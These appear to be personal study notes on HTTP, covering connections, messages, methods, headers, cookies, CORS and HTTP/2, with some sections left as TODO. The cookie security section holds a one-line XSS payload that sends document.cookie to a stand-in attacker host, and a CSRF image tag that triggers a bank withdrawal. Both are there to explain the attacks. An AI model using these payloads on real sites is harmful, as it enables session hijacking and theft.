# HTTP
HTTP is a protocol which allows the fetching of resources, such as HTML documents. A complete document is reconstructed from the different sub-documents fetched, for instance text, layout description, images, videos, scripts, and more.
![](https://mdn.mozillademos.org/files/13677/Fetching_a_page.png)

## Midleware
### Proxies
- caching (the cache can be public or private, like the browser cache)
- filtering (like an antivirus scan, parental controls, …)
- load balancing (to allow multiple servers to serve the different requests)
- authentication (to control access to different resources)
- logging (allowing the storage of historical information)

## Basic concepts
#### HTTP is stateless, but not sessionless
While the core of HTTP itself is stateless, HTTP cookies allow the use of stateful sessions. **Using header** extensibility, HTTP **Cookies** are added to the workflow, allowing session creation on each HTTP request to share the same context, or the same state.

#### HTTP and connections
- HTTP/1.0 opened a TCP connection for each request/response exchange
-  HTTP/1.1 introduced pipelining: the underlying TCP connection can be partially controlled using the **Connection** header
-  HTTP/2 multiplex messages over a single connection, helping keep the connection warm, and more efficient

## What can be controlled by HTTP
#### Cache
The server can instruct proxies, and clients, what to cache and for how long
#### Relaxing the origin constraint
HTTP headers can relax separation server-side, allowing a document to become a patchwork of information sourced from different domains
#### Authentication
Basic authentication may be provided by HTTP, either using the WWW-Authenticate and similar headers, or by setting a specific session using HTTP cookies.
#### Session
Using HTTP cookies allows you to link requests with the state of the server. This creates sessions, despite basic HTTP being a state-less protocol.

## HTTP flow
1. Open a TCP connection
2. Send an HTTP message. HTTP/1 is human-readable but HTTP/2 is not.
```http
GET / HTTP/1.1
Host: developer.mozilla.org
Accept-Language: fr
```
3. Read the response sent by the server
```http
HTTP/1.1 200 OK
Date: Sat, 09 Oct 2010 14:28:02 GMT
Server: Apache
Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
ETag: "51142bc1-7449-479b075b2891b"
Accept-Ranges: bytes
Content-Length: 29769
Content-Type: text/html

<!DOCTYPE html... (here comes the 29769 bytes of the requested web page)
```
4. Close or reuse the connection for further requests.

### Connections
- short-lived connections
- persistent connections
- HTTP pipelining
![](https://mdn.mozillademos.org/files/13727/HTTP1_x_Connections.png)
*It's important point to note that connection management in HTTP applies to the connection between two consecutive nodes, which is hop-by-hop and not end-to-end.*

#### Short-lived connections
Open new TCP connection for each request
#### Persistent connections
Connection is opened for multiple requests. The time of opened connection could be limited by ** Keep-Alive** header.
HTTP/1.1 by default use short-live connection, HTTP/2 use persistent connection
#### HTTP pipelining
TODO



## HTTP Messages
### Request
![](https://mdn.mozillademos.org/files/13687/HTTP_Request.png)
- An HTTP method (**GET**, **POST** or a noun like **OPTIONS** or **HEAD**)
- The path of the resource to fetch
- The version of the HTTP protocol.
- Optional headers that convey additional information for the servers.
- Or a body, for some methods like **POST**
### Response
![](https://mdn.mozillademos.org/files/13691/HTTP_Response.png)
- The version of the HTTP protocol they follow.
- A status code, indicating if the request has been successful, or not, and why.
- A status message, a non-authoritative short description of the status code.
- HTTP headers, like those for requests.
- Optionally, a body containing the fetched resource.

## HTTP methods
- **GET**, **POST**, **PUT**, **DELETE**
- **HEAD** - asks for a response identical to that of a GET request, but without the response body.
- **CONNECT** - establishes a tunnel to the server identified by the target resource.
- **OPTIONS** - is used to describe the communication options for the target resource.
- **TRACE** - performs a message loop-back test along the path to the target resource.
- **PATCH** - is used to apply partial modifications to a resource.

## HTTP response status codes TODO
### 1xx information responses
**101** Switching Protocol
### 2xx 
todo

## HTTP headers
HTTP headers allow the client and the server to pass additional information with the request or the response
- **General** header: Headers applying to both requests and responses but with no relation to the data eventually transmitted in the body.
- **Request** header: Headers containing more information about the resource to be fetched or about the client itself.
- **Response** header: Headers with additional information about the response, like its location or about the server itself (name and version etc.).
- **Entity** header: Headers containing more information about the body of the entity, like its content length or its MIME-type.
#### Examples:
**Expires** - the date/time after which the response is considered stale.
**Keep-Alive** - controls how long a persistent connection should stay open.
**Cookie** - Contains stored HTTP cookies previously sent by the server with the **Set-Cookie** header.
**DNT** (Do not track) - used for expressing the user's tracking preference.
**Content-Type** - indicates the media type of the resource.

## HTTP cookies
Cookies - is a small piece of data that a server sends to the user's web browser. It remembers stateful information for the stateless HTTP protocol.
- **Session management** - Logins, shopping carts, game scores, or anything else the server should remember
- **Personalization** - User preferences, themes, and other settings
- **Tracking** - Recording and analyzing user behavior
Cookies are sent with every request, so they can worsen performance (especially for mobile data connections). Modern APIs for client storage are the Web storage API (localStorage and sessionStorage) and IndexedDB.
When receiving an HTTP request, a server can send a **Set-Cookie** header with the response. The cookie is usually stored by the browser, and then the cookie is sent with requests made to the same server inside a **Cookie** HTTP header.

**Response**
```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```
**Request**
```http
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```
The cookie created above is a session cookie: it is deleted when the client shuts down, because it didn't specify an Expires or Max-Age directive. 
```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```
#### Scope of cookies
The **Domain** and **Path** directives define thescope of the cookie: what URLs the cookies should be sent to.
### Security
Cookies are often used in web application to identify a user and their authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session. Common ways to steal cookies include Social Engineering or exploiting an XSS vulnerability in the application.
```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
The **HttpOnly** cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.
#### Cross-site request forgery (CSRF)
```js
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```
### Tracking and privacy
**Third-party cookies**
Cookies that shares between domains. Usually used for cross-site tracking.
**Do-Not-Track**
Advise to not to transfer cookies between domain

## Cross-Origin Resource Sharing (CORS)
Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to tell a browser to let a web application running at one origin (domain) have permission to access selected resources from a server at a different origin.
![](https://mdn.mozillademos.org/files/14295/CORS_principle.png)
An example of a cross-origin request: 
*The frontend JavaScript code for a web application served from http://domain-a.com uses XMLHttpRequest to make a request for http://api.domain-b.com/data.json.*
TBD

## HTTP/2 vs HTTP/1.1
![](https://mdn.mozillademos.org/files/13825/HTTPMsg2.png)
![](https://mdn.mozillademos.org/files/13819/Binary_framing2.png)
- It is a binary protocol rather than text. It can no longer be read and created manually despite this hurdle, improved optimization techniques can now be implemented.
- It is a multiplexed protocol. Parallel requests can be handled over the same connection, removing the order and blocking constraints of the HTTP/1.x protocol.
- It allows a server to populate data in a client cache, in advance of it being required, through a mechanism called the server push.


